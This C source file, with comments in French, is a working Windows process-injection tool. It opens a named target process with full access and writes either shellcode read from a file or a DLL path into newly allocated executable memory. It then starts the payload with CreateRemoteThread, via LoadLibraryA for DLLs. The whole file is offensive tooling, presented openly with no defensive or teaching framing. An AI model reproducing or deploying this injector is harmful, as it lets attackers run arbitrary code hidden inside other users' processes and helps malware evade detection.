// 21/05/2017 //
#include <windows.h>
#include <stdio.h>
#include "functions.h"
#define SHELLCODE 0x01
#define DLL 0x02

int  main(int argc, char* argv[])
{
    int kind;
    DWORD oldProtect = 0;
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
    WORD saved_attributes;
    GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
    saved_attributes = consoleInfo.wAttributes;
    int size;
    char* shellcode;
    LPVOID addr = NULL;
    HANDLE threadID;
    LPVOID AddressVirtualAlloc;

    // < process_name.exe > < chemin vers dll ou shellcode > < dll | shellcode >
    if(argc <= 3)
    {
        die(hConsole, saved_attributes, "[!] No process, path or type given");
        exit(0);
    }

    // si arg 3 = shellcode
    if(strcmp(argv[3], "shellcode") == 0)
    {
        // On récupère le shellcode et sa taille
        printf("======== SHELLCODE ========\n");
        MallocRes res = openFile(hConsole, saved_attributes, argv[2]);
        shellcode = res.buffer;
        size = res.size;
        kind = SHELLCODE;
    }
        // si arg 3 = DLL
    else if(strcmp(argv[3], "dll") == 0)
    {
        // On récupère la DLL
        shellcode = argv[2];
        size = (int)strlen(argv[2]);
        kind = DLL;
        printf("======== DLL ========\n");
    }
    else
    {
        die(hConsole, saved_attributes, "[!] Pleaser enter type of payload");
        exit(0);
    }

    // Si on ne parvient pas à ouvrir le shellcode
    if(shellcode == NULL || size == 0)
    {
        printf("[!] Cannot open file ");
    }
    else
    {
        // On récupère le PID
        int pid = GetCalcPID(argv[1]);

        if(pid != 0)
        {
            printf("[+] %s PID = %d\n", argv[1], pid);
            // On récupère un handle sur le processus via sont ID
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

            if(hProcess)
            {
                printf("[+] OpenProcess ... OK\n");

                if(kind == DLL)
                {
                    // Si c'est une DLL on récupère l'adresse de la fonction LoadLibraryA dans kernel32.dll
                    addr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                    if(addr != NULL)
                        printf("[+] GetProcAddress 0x%p\n", addr);
                    else
                    {
                        die(hConsole,saved_attributes,"[!] GetProcAddress... NO\n");
                        exit(0);
                    }
                }

                // On alloue une page de mémoire de la taille du shellcode / path de la DLL et on récupère son adresse de début
                AddressVirtualAlloc = VirtualAllocEx(hProcess, 0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if(AddressVirtualAlloc)
                {
                    printf("[+] Virtual Alloc ... 0x%p\n", AddressVirtualAlloc);
                    // On écrit notre shellcode / path de dll au début de la page
                    if (WriteProcessMemory(hProcess, AddressVirtualAlloc, shellcode, size, NULL))
                    {
                        printf("[+] WriteProcessMemory %d bytes ... OK\n", size);
                        // On change la protection de la page
                        if (VirtualProtectEx(hProcess, AddressVirtualAlloc, size, PAGE_EXECUTE_READ, &oldProtect))
                        {
                            printf("[+] VirtualProtectEx ... OK\n");
                            if(kind == SHELLCODE)
                            {
                                // On crée le thread dans le processus si c'est un shellcode
                                threadID = CreateRemoteThread(hProcess, NULL, 0,  (LPTHREAD_START_ROUTINE) AddressVirtualAlloc, NULL, NULL, NULL);
                            }
                            else
                            {
                                // On crée le thread dans le processus si c'est une DLL
                                threadID = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) addr,  AddressVirtualAlloc, NULL, NULL);
                            }
                            if (threadID != NULL)
                            {
                                // Tout est bon !d
                                printf("[+] CreateRemoteThread ... OK\n");
                                printf("[+] Thread ID %d\n", GetThreadId(threadID));
                                SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
                                printf("[+] Injection successful \n");
                                SetConsoleTextAttribute(hConsole, saved_attributes);
                            }
                            else
                                die(hConsole,saved_attributes,"[!] CreateRemoteThread... NO\n");
                        }
                        else
                            die(hConsole,saved_attributes,"[!] VirtualProtectEx ... NO\n");

                    }
                    else
                        die(hConsole,saved_attributes,"[!] WriteProcessMemory ... NO\n");
                }
                else
                    die(hConsole,saved_attributes,"[!] VirtualAllocEx ... NO\n");

            }
            else
                die(hConsole,saved_attributes,"[!] OpenProcess ... NO\n");
        }
        else
            die(hConsole,saved_attributes,"[!] PID not found\n");
    }



    return 0;
}